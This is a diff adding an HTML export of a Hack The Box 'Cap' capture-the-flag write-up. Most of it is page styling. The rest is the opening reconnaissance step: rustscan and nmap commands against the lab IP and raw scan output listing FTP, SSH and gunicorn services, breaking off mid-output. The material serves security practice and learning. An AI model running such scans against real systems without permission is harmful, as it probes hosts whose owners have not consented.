@@ -1,0 +1,797 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Cap</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="8b830850-94a6-4e3d-bbcf-ea41be57de12" class="page sans"><header><div class="page-header-icon undefined"><img class="icon" src="https://xavilok.es/posts/md_assets/Cap/Cap.webp"/></div><h1 class="page-title">Cap</h1><table class="properties"><tbody><tr class="property-row property-row-text"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesText"><path d="M7,4.56818 C7,4.29204 6.77614,4.06818 6.5,4.06818 L0.5,4.06818 C0.223858,4.06818 0,4.29204 0,4.56818 L0,5.61364 C0,5.88978 0.223858,6.11364 0.5,6.11364 L6.5,6.11364 C6.77614,6.11364 7,5.88978 7,5.61364 L7,4.56818 Z M0.5,1 C0.223858,1 0,1.223858 0,1.5 L0,2.54545 C0,2.8216 0.223858,3.04545 0.5,3.04545 L12.5,3.04545 C12.7761,3.04545 13,2.8216 13,2.54545 L13,1.5 C13,1.223858 12.7761,1 12.5,1 L0.5,1 Z M0,8.68182 C0,8.95796 0.223858,9.18182 0.5,9.18182 L11.5,9.18182 C11.7761,9.18182 12,8.95796 12,8.68182 L12,7.63636 C12,7.36022 11.7761,7.13636 11.5,7.13636 L0.5,7.13636 C0.223858,7.13636 0,7.36022 0,7.63636 L0,8.68182 Z M0,11.75 C0,12.0261 0.223858,12.25 0.5,12.25 L9.5,12.25 C9.77614,12.25 10,12.0261 10,11.75 L10,10.70455 C10,10.4284 9.77614,10.20455 9.5,10.20455 L0.5,10.20455 C0.223858,10.20455 0,10.4284 0,10.70455 L0,11.75 Z"></path></svg></span>OS</th><td>Linux</td></tr><tr class="property-row property-row-text"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesText"><path d="M7,4.56818 C7,4.29204 6.77614,4.06818 6.5,4.06818 L0.5,4.06818 C0.223858,4.06818 0,4.29204 0,4.56818 L0,5.61364 C0,5.88978 0.223858,6.11364 0.5,6.11364 L6.5,6.11364 C6.77614,6.11364 7,5.88978 7,5.61364 L7,4.56818 Z M0.5,1 C0.223858,1 0,1.223858 0,1.5 L0,2.54545 C0,2.8216 0.223858,3.04545 0.5,3.04545 L12.5,3.04545 C12.7761,3.04545 13,2.8216 13,2.54545 L13,1.5 C13,1.223858 12.7761,1 12.5,1 L0.5,1 Z M0,8.68182 C0,8.95796 0.223858,9.18182 0.5,9.18182 L11.5,9.18182 C11.7761,9.18182 12,8.95796 12,8.68182 L12,7.63636 C12,7.36022 11.7761,7.13636 11.5,7.13636 L0.5,7.13636 C0.223858,7.13636 0,7.36022 0,7.63636 L0,8.68182 Z M0,11.75 C0,12.0261 0.223858,12.25 0.5,12.25 L9.5,12.25 C9.77614,12.25 10,12.0261 10,11.75 L10,10.70455 C10,10.4284 9.77614,10.20455 9.5,10.20455 L0.5,10.20455 C0.223858,10.20455 0,10.4284 0,10.70455 L0,11.75 Z"></path></svg></span>IP</th><td>10.10.10.245</td></tr><tr class="property-row property-row-checkbox"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCheckbox"><path d="M0,3 C0,1.34314 1.34326,0 3,0 L11,0 C12.6567,0 14,1.34314 14,3 L14,11 C14,12.6569 12.6567,14 11,14 L3,14 C1.34326,14 0,12.6569 0,11 L0,3 Z M3,1.5 C2.17139,1.5 1.5,2.17157 1.5,3 L1.5,11 C1.5,11.8284 2.17139,12.5 3,12.5 L11,12.5 C11.8286,12.5 12.5,11.8284 12.5,11 L12.5,3 C12.5,2.17157 11.8286,1.5 11,1.5 L3,1.5 Z M2.83252,6.8161 L3.39893,6.27399 L3.57617,6.10425 L3.92334,5.77216 L4.26904,6.10559 L4.44531,6.27582 L5.58398,7.37402 L9.28271,3.81073 L9.45996,3.64008 L9.80664,3.3056 L10.1538,3.63989 L10.3311,3.81067 L10.8936,4.35303 L11.0708,4.52399 L11.4434,4.88379 L11.0708,5.24353 L10.8936,5.41437 L6.1084,10.0291 L5.93115,10.2 L5.58398,10.5344 L5.23682,10.2 L5.05957,10.0292 L2.83057,7.87946 L2.65283,7.70801 L2.27832,7.34674 L2.6543,6.98694 L2.83252,6.8161 Z"></path></svg></span>Complete</th><td><div class="checkbox checkbox-on"></div></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M7,13 C10.31348,13 13,10.31371 13,7 C13,3.68629 10.31348,1 7,1 C3.68652,1 1,3.68629 1,7 C1,10.31371 3.68652,13 7,13 Z M3.75098,5.32278 C3.64893,5.19142 3.74268,5 3.90869,5 L10.09131,5 C10.25732,5 10.35107,5.19142 10.24902,5.32278 L7.15771,9.29703 C7.07764,9.39998 6.92236,9.39998 6.84229,9.29703 L3.75098,5.32278 Z"></path></svg></span>OSCP </th><td><span class="selected-value select-value-color-yellow">no</span></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M7,13 C10.31348,13 13,10.31371 13,7 C13,3.68629 10.31348,1 7,1 C3.68652,1 1,3.68629 1,7 C1,10.31371 3.68652,13 7,13 Z M3.75098,5.32278 C3.64893,5.19142 3.74268,5 3.90869,5 L10.09131,5 C10.25732,5 10.35107,5.19142 10.24902,5.32278 L7.15771,9.29703 C7.07764,9.39998 6.92236,9.39998 6.84229,9.29703 L3.75098,5.32278 Z"></path></svg></span>Status</th><td><span class="selected-value select-value-color-red">Cracked</span></td></tr></tbody></table></header><div class="page-body"><figure id="5aa56cc2-fe1a-432e-a3e7-325e625ea145"><a href="https://app.hackthebox.com/profile/355204" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Hack The Box</div></div><div class="bookmark-href"><img src="https://app.hackthebox.com/images/HTB-favicon/favicon.ico" class="icon bookmark-icon"/>https://app.hackthebox.com/profile/355204</div></div></a><figcaption>profile</figcaption></figure><p id="1dbe04bd-84ea-4741-9449-6bc3d82158d1" class="">
+</p><figure id="896ae924-cf3b-4384-9628-75b7b398c241"><a href="https://kshitijraj.vercel.app/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Kshitij Protfolio Website</div><div class="bookmark-description">CyberSecurity Enthusiast and Researcher Tweaking around machine and finding a way to inside them. Basically I do Pentesting and do research on bugs . I do CTF challanges on different platform , learn about different vulnerability and trying to contribute to make cyberspace a safe place .</div></div><div class="bookmark-href"><img src="https://kshitijraj.vercel.app/favicon/favicon-16x16.png" class="icon bookmark-icon"/>https://kshitijraj.vercel.app/</div></div><img src="https://kshitijraj.vercel.app/img/Kshitij2%20(Custom).jpg" class="bookmark-image"/></a><figcaption>Website</figcaption></figure><h1 id="5b10716b-cea6-47bf-abb9-af39cf9e091a" class="block-color-yellow_background">Cap Writeup</h1><h2 id="89779882-e352-4ed7-8af7-85f68d00f731" class="">1.Port Scanning</h2><p id="f13ef17a-ccc7-42ff-89e9-233349949396" class="">As I first run a port scanning using  rust  </p><p id="39443c15-95fb-4c3e-9ace-6c54939445d0" class="">
+</p><pre id="acb08401-b6d2-4dc7-a51b-efb693438e66" class="code code-wrap"><code>rustscan -a 10.10.10.245</code></pre><p id="4eb29ce9-1703-4666-b4b2-ae91b784e703" class="">
+</p><figure id="bb62cdb9-20b8-4516-819f-b75080994a25" class="image"><a href="Cap%20bb62c/Untitled.png"><img style="width:691px" src="Cap%20bb62c/Untitled.png"/></a></figure><p id="a42ebdd4-0649-41f0-a2db-8485860bd7dd" class="">
+</p><p id="3cdebb94-9fdf-41ad-a3d1-3107fc653ad7" class="">Then i used nmap for detailed report of network </p><p id="06b5923d-3dd5-4725-95b7-f8c1a4810918" class="">
+</p><pre id="8bd2bc7c-ad78-47a0-8f5a-804d147b1593" class="code code-wrap"><code>nmap -T4 -sC -sV -oN /home/ezio/htb/cap/cap 10.10.10.245</code></pre><p id="1fb3acab-0703-4e93-a530-82db6b102dfc" class="">
+</p><pre id="c5d995bb-d355-4158-a990-316be135c915" class="code code-wrap"><code>#Nmap 7.91 scan initiated Sun Aug 15 22:18:33 2021 as: nmap -T4 -sC -sV -oN /home/ezio/htb/cap/cap 10.10.10.245
+Nmap scan report for 10.10.10.245
+Host is up (0.27s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
+|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
+|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
+80/tcp open  http    gunicorn
+| fingerprint-strings:
+|   FourOhFourRequest:
+|     HTTP/1.0 404 NOT FOUND
+|     Server: gunicorn
+|     Date: Mon, 16 Aug 2021 02:33:07 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 232
+|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+|     &lt;title&gt;404 Not Found&lt;/title&gt;
+|     &lt;h1&gt;Not Found&lt;/h1&gt;
+|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Mon, 16 Aug 2021 02:33:00 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 19386
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
+|     &lt;title&gt;Security Dashboard&lt;/title&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;
+|     &lt;!-- amchar
+|   HTTPOptions:
+|     HTTP/1.0 200 OK
+|     Server: gunicorn
+|     Date: Mon, 16 Aug 2021 02:33:01 GMT
+|     Connection: close
+|     Content-Type: text/html; charset=utf-8
+|     Allow: OPTIONS, HEAD, GET
+|     Content-Length: 0
+|   RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|     Content-Type: text/html
+|     Content-Length: 196
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;title&gt;Bad Request&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
+|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
+|     &lt;/body&gt;
+|_    &lt;/html&gt;
+|_http-server-header: gunicorn
+|_http-title: Security Dashboard
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.91%I=7%D=8/15%Time=6119CB26%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,2FE5,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
+SF:Mon,\x2016\x20Aug\x202021\x2002:33:00\x20GMT\r\nConnection:\x20close\r\
